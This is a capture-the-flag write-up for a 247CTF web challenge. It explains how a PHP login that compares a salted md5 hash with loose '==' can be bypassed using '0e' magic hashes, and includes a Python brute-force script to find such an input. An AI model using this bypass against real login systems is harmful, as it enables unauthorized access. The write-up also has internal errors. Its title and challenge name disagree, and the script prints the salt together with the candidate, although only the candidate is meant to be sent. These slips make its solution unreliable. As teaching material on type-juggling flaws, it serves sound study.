# COMPARE THE PAIR

### Intro

This is my write-up for the Web challenge "Secured Session" on the CTF site 247CTF.com.

### Challenge Details

The challenge involves guessing a way to bypass the login logic using something related to `md5`.

### Steps to Solve

### 1. Access the Application

Start by accessing the web application provided for the challenge.

### 2. Analyze the Provided PHP Code

```php
<?php
  require_once('flag.php');
  $password_hash = "0e902564435691274142490923013038";
  $salt = "f789bbc328a3d1a3";
  if(isset($_GET['password']) && md5($salt . $_GET['password']) == $password_hash){
    echo $flag;
  }
  echo highlight_file(__FILE__, true);
?>
```

The code takes the `$salt` and concatenates it with our `$password` input, then `md5` hashes it to compare with the `$password_hash`.

We have no information about what the password might be, and brute-forcing it could take a long time.

### 3. Understanding the Vulnerability

In PHP, the comparison operator `==` is used to compare two values for equality. It checks if the values are equal after performing type juggling, which means PHP will try to convert the values to a common type before making the comparison.

#### Key Points About `==` in PHP:

1.  **Type Juggling**: PHP automatically converts the data types of the operands to a common type when using `==`. For example:

    ```php
    if (5 == "5") {
        echo "Equal";
    }
    ```

    In this case, `"5"` (a string) is converted to an integer, so the comparison `5 == "5"` returns true.
2.  **Loose Comparison**: Because of type juggling, `==` is known as a "loose comparison." For example:

    ```php
    if (0 == false) {
        echo "Equal";
    }
    ```

    Here, `0` is considered equivalent to `false`, so the comparison returns true.
3. **Common Pitfalls**:
   *   Comparing different types can lead to unexpected results:

       ```php
       if ("0" == false) {
           echo "Equal";
       }
       ```

       The string `"0"` is treated as `false` when loosely compared, so this would also return true.

Also, we can see that the format of the `$password_hash` looks like a very large number starting with `0e...`.

When you compare a string like `0e1234` to other values using `==`, PHP treats `0e1234` as a number, specifically the number `0`. This can lead to surprising results:

```php
if ("0e1234" == 0) {
    echo "Equal";
} else {
    echo "Not Equal";
}
```

**Output**: `"Equal"`

### 4. Exploiting the Vulnerability

The vulnerability is now clear: all we have to do is find a password that, when concatenated with `$salt`, its `md5` hash generates a string that looks like a large number (starts with `0e` and the rest are digits).

Here is the Python code that can be used to find such a password:

```python
from itertools import product  # Import the product function from itertools to generate combinations
import hashlib  # Import the hashlib module for generating MD5 hashes

# Iterate through different lengths of the combination
for x in range(0, 10):  # Loop over lengths from 0 to 9 (inclusive)
    # Generate all possible combinations of the alphabet with the current length 'x'
    for combo in product("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", repeat=x):
        # Create the string to hash by appending the current combination to the fixed string
        result = hashlib.md5(("f789bbc328a3d1a3" + ''.join(combo)).encode()).hexdigest()

        # Check if the resulting hash has the desired properties
        if result.startswith("0e") and result[2:].isdigit():  # Look for a hash that starts with '0e' and is followed only by digits
            # If a matching hash is found, print the string that generated it
            print("f789bbc328a3d1a3" + ''.join(combo))
        else:
            pass  # If the hash doesn't match the criteria, do nothing and continue
```

Once you find a matching password, you can send it to the server with `?password=xxxxxx`. If the correct password is found, you will receive the flag.

### Resources

* [PHP Type Juggling](https://www.php.net/manual/en/language.types.type-juggling.php)
* [Write-up Reference](https://github.com/abhaynayar/obsidian/blob/master/labs/web/247ctf.md)
